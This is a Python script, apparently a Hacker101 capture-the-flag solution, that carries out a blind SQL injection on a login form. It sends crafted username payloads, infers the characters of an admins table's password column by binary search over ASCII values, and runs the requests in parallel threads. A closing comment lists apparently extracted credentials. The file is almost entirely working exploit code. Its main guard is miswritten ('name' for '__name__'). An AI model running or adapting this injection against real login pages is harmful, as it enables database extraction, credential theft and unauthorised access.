import requests as rq
import math
import concurrent.futures


LOGIN_URL = 'https://3ffe4b4863ca6f0318aff7f3fa831367.ctf.hacker101.com/login'


def compare(char_idx: int, comparison: str, ascii_val: int,
            login_url: str = LOGIN_URL,
            column: str = 'username',
            table: str = 'admins',
            row: int = 0):
    payload = f"""xxx' OR ORD(SUBSTRING((SELECT {column} FROM {table} LIMIT 1 OFFSET {row}), {char_idx+1}, 1)) {comparison} '{ascii_val}"""
    return 'Invalid password' in rq.post(login_url, data={'username': payload, 'password': ''}).text

def binary_search(char_idx: int, **kwargs):
    L = 0
    R = 255
    old_m = 0
    while L <= R:
        m = math.floor((L + R) / 2)
        if old_m == m:
            return -1
        if compare(char_idx, '>', m, **kwargs):
            L = m + 1
            old_m = m
        elif compare(char_idx, '<', m, **kwargs):
            R = m - 1
        else:
            return chr(m)
        old_m = m
    return -1

def check_char(char_idx: int, char: str,
               login_url: str = LOGIN_URL,
               column: str = 'username',
               table: str = 'admins',
               row: int = 0):
    payload = f"""xxx' OR SUBSTRING((SELECT {column} FROM {table} LIMIT 1 OFFSET {row}), {char_idx+1}, 1) = '{char}"""
    return 'Invalid password' in rq.post(login_url, data={'username': payload, 'password': ''}).text

if name == '__main__':
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        future_to_idx = {executor.submit(binary_search, i, column='password'): i for i in range(11)}
    
    for f, i in future_to_idx.items():
        print(i, f.result())

    # row 0 - erasmo | doyle
